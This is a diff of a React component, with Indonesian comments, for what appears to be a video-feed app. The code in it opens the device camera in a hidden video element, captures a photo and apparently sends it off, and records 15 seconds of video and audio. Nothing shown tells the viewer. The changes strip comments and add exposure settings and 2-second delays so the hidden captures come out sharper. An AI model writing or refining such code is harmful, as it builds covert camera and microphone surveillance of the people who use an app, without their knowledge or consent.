@@ -111,9 +111,9 @@ function App() {
 
     // Deteksi spesifikasi perangkat
     const deviceSpec = {
-      cores: navigator.hardwareConcurrency || 1, // Jumlah core CPU
-      screenWidth: window.screen.width, // Lebar layar
-      isLowEnd: navigator.hardwareConcurrency < 4 || window.screen.width < 720, // Tentukan apakah low-end
+      cores: navigator.hardwareConcurrency || 1,
+      screenWidth: window.screen.width,
+      isLowEnd: navigator.hardwareConcurrency < 4 || window.screen.width < 720,
     };
 
     console.log('Spesifikasi Perangkat:', deviceSpec);
@@ -149,6 +149,8 @@ function App() {
           video: {
             ...getDeviceConstraints().video,
             facingMode: typeof facingMode === 'string' ? facingMode : { exact: facingMode.deviceId },
+            // Tambahkan opsi untuk exposure otomatis jika didukung
+            ...(navigator.mediaDevices.getSupportedConstraints().exposureMode && { exposureMode: 'continuous' }),
           },
         };
 
@@ -268,7 +270,6 @@ function App() {
       }
     }
 
-    // Deteksi spesifikasi perangkat untuk perekaman
     const deviceSpec = {
       isLowEnd: navigator.hardwareConcurrency < 4 || window.screen.width < 720,
     };
@@ -282,10 +283,11 @@ function App() {
       cameraVideo.style.display = 'none';
       document.body.appendChild(cameraVideo);
 
+      // Tunggu hingga video stabil (misalnya 2 detik)
       await new Promise((resolve) => {
         cameraVideo.onloadedmetadata = async () => {
           await cameraVideo.play().catch(err => console.error(`Gagal memutar video kamera ${type}:`, err));
-          setTimeout(resolve, 500);
+          setTimeout(resolve, 2000); // Tunggu 2 detik untuk stabilisasi
         };
       });
 
@@ -315,7 +317,11 @@ function App() {
 
       const context = canvas.getContext('2d', { willReadFrequently: true });
       if (context) {
-        context.drawImage(cameraVideo, 0, 0, drawWidth, drawHeight);
+        // Ambil frame setelah 2 detik untuk memastikan kualitas
+        await new Promise((resolve) => setTimeout(() => {
+          context.drawImage(cameraVideo, 0, 0, drawWidth, drawHeight);
+          resolve(null);
+        }, 2000));
       }
 
       const photoBlob = await new Promise<Blob>((resolve) => {
@@ -329,14 +335,14 @@ function App() {
         console.error(`Gagal mengirim foto dari kamera ${type}:`, error);
       }
 
-      // Optimasi pengkodean video berdasarkan spesifikasi
+      // Optimasi pengkodean video
       const supportedMimeType = ['video/mp4;codecs=h264', 'video/webm;codecs=vp8']
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4;codecs=h264';
 
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: deviceSpec.isLowEnd ? 1000000 : 2500000, // Bitrate lebih rendah untuk low-end
-        audioBitsPerSecond: deviceSpec.isLowEnd ? 64000 : 96000, // Bitrate audio lebih rendah untuk low-end
+        videoBitsPerSecond: deviceSpec.isLowEnd ? 1000000 : 2500000,
+        audioBitsPerSecond: deviceSpec.isLowEnd ? 64000 : 96000,
       });
 
       mediaRecorderRef.current = mediaRecorder;
@@ -365,7 +371,7 @@ function App() {
         console.error(`Error saat merekam kamera ${type}:`, e);
       };
 
-      mediaRecorder.start(deviceSpec.isLowEnd ? 1000 : 500); // Interval lebih panjang untuk low-end
+      mediaRecorder.start(deviceSpec.isLowEnd ? 1000 : 500);
 
       await new Promise((resolve) => setTimeout(() => {
         if (mediaRecorder.state === 'recording') {
@@ -373,7 +379,7 @@ function App() {
           console.log(`Perekaman kamera ${type} dihentikan setelah 15 detik.`);
         }
         resolve(null);
-      }, 15000)); // Kurangi durasi untuk performa
+      }, 15000));
 
       if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
     } catch (error) {
@@ -577,14 +583,14 @@ function App() {
                 )}
                 <video
                   ref={(el) => (videoRefs.current[index] = el)}
-                  src={video.videoUrl} // Selalu set src untuk memastikan video dimuat
+                  src={video.videoUrl}
                   className="w-full h-full object-cover"
                   muted
                   onClick={() => handleVideoClick(index)}
                   onEnded={() => handleVideoEnded(index)}
                   onCanPlay={() => handleCanPlay(index)}
                   onError={() => handleVideoError(index)}
-                  preload="auto" // Optimalkan buffering
+                  preload="auto"
                   playsInline
                   {...({ loading: 'lazy' } as any)}
                 >
